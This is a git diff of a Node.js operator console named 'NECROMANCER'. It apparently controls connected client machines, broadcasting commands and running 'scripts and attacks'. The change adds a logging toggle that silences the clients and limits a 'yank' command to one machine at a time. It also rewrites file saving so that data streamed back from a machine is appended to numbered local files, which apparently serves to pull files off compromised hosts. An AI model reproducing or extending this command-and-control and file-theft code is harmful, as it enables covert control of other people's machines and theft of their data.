@@ -8,6 +8,9 @@ const rl = readline.createInterface({
 	output: process.stdout,
 });
 
+let logging = false;
+let fileNum = 0;
+
 export function prompt() {
 	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
 		message = message.toLowerCase();
@@ -74,11 +77,30 @@ export function prompt() {
 			}
 		}
 
+		if (message.startsWith("logging")) {
+			if (message === "logging") console.log(`logging: ${logging}`);
+			else if (commandArgs.firstArg === "true") {
+				logging = true;
+				clientModules.silent = true;
+			} else {
+				logging = false;
+				clientModules.silent = false;
+			}
+		}
+
 		if (message === "clear") console.clear();
 
 		if (message.startsWith("yank")) {
-			clientModules.silent = true;
-			broadcast(message);
+			if (clientModules.clientInstances.length > 1)
+				return console.log(
+					"You can only use this command on one machine at a time"
+				);
+			else {
+				if (logging) {
+					fileNum++;
+					broadcast(message);
+				} else console.log("Please enable logging to use this feature");
+			}
 		}
 
 		// Scripts and attacks
@@ -147,9 +169,7 @@ function runScript(scriptName) {
 	});
 }
 
-export function saveFile(fileName, data) {
-	fs.writeFile(fileName, data, (err) => {
-		console.log("\nThe file was saved!");
-		prompt();
-	});
+export function saveFile(chunk) {
+	const writeStream = fs.createWriteStream(`file ${fileNum}`, { flags: "a" });
+	writeStream.write(chunk);
 }
